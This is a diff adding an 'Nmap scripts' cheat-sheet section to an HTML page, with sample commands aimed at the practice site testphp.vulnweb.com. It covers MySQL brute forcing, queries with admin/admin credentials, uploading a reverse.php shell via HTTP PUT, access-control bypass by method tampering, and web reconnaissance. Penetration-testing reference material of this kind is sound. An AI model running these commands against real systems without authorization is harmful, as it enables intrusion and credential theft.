@@ -44,6 +44,102 @@
 			<p>Lorem ipsum dolor sit, amet consectetur adipisicing elit. Molestias eaque enim necessitatibus a saepe? Iusto itaque at nostrum alias molestias qui quas minus odit aliquam. Alias rem aperiam ducimus optio.</p>
 		</div>
 
+		<h2>Nmap scripts</h2>
+
+		<div class="box">
+			<h3>mysql-brute</h3>
+			<p>MySQL brute force script</p>
+			<code class="etc">
+				userdb=&ltwordlist&gt <br>
+				passdb=&ltwordlist&gt <br>
+				brute.firstonly=&ltboolean&gt ── exits nmap after a match, default is false
+			</code>
+			<code>nmap -p 3306 testphp.vulnweb.com --script mysql-brute --script-args userdb=/usr/share/userlist,passdb=/usr/share/passlist</code>
+		</div>
+
+		<div class="box">
+			<h3>mysql-query</h3>
+			<p>script for query in MySQL</p>
+			<code class="etc">
+				mysql-query.query=&ltquery&gt ── query to send<br>
+				mysql-query.username=&ltuser&gt <br>
+				mysql-query.pass=&ltpass&gt
+			</code>
+			<code>nmap -p 3306 testphp.vulnweb.com --script mysql-query --script-args mysql-query.query='show databases,mysql-query.username=admin,mysql-query.password=admin</code>
+		</div>
+
+		<div class="box">
+			<h3>http-enum</h3>
+			<p>web server directory enum</p>
+			<code>nmap testphp.vulnweb.com -p 80 --script http-enum</code>
+		</div>
+
+		<div class="box">
+			<h3>http-put</h3>
+			<p>exploit web servers with PUT enabled, uploading a file</p>
+			<code class="etc">
+				http-put.file=&ltfile&gt ── file to upload <br>
+				http-put.url=&lturl&gt ── upload in directory, and rename the file
+			</code>
+			<code>nmap testphp.vulnweb.com -p 80 --script http-put --script-args http-put.file=/root/reverse.php,http-put.url=/wp-config/upload</code>
+		</div>
+
+		<div class="box">
+			<h3>http-tamper</h3>
+			<p>exploits a misconfiguration where the path is only blocked via GET</p>
+			<code class="etc">
+				http-method-tamper.uri=&lturi&gt ── possible misconfigurated path
+			</code>
+			<code>nmap testphp.vulnweb.com -p 80 --script http-method-tamper --script-args http-method-tamper.uri=/login</code>
+		</div>
+
+		<div class="box">
+			<h3>http-csrf</h3>
+			<p>scans fpr csrf vulnerability</p>
+			<code>nmap testphp.vulnweb.com -p 80 --script http-csrf</code>
+		</div>
+
+		<div class="box">
+			<h3>traceroute-geolocation</h3>
+			<p>see geolocation of host</p>
+			<code>nmap testphp.vulnweb.com -p 80 --traceroute --script traceroute-geolocation</code>
+		</div>
+
+		<div class="box">
+			<h3>http-waf-detect</h3>
+			<p>verifies firewalls in web servers</p>
+			<code class="etc">
+				http-waf-detect.aggro=&ltboolean&gt ── tries the hardest to detect, more aggressive
+			</code>
+			<code>nmap testphp.vulnweb.com -p 80 --script http-waf-detect</code>
+		</div>
+
+		<div class="box">
+			<h3>http-waf-fingerprint</h3>
+			<p>determines waf used</p>
+			<code class="etc">
+				http-waf-fingerprint.intensive ── tries the hardest to detect, more aggressive
+			</code>
+			<code>nmap testphp.vulnweb.com -p 80 --script http-waf-fingerprint</code>
+		</div>
+
+		<div class="box">
+			<h3>http-robots.txt</h3>
+			<p>searches for directories in robots.txt</p>
+			<code>nmap testphp.vulnweb.com -p 80 --script http-robots.txt</code>
+		</div>
+
+		<div class="box">
+			<h3>http-auth-finder</h3>
+			<p>finds auth pages</p>
+			<code class="etc">
+				http-auth-finder.maxdepth=&ltvalue&gt ── recursive depth, default is 3
+			</code>
+			<code>nmap testphp.vulnweb.com -p 80 --script http-auth-finder</code>
+		</div>
+
 	</main>
+
+	<aside></aside>
 </body>
 </html>
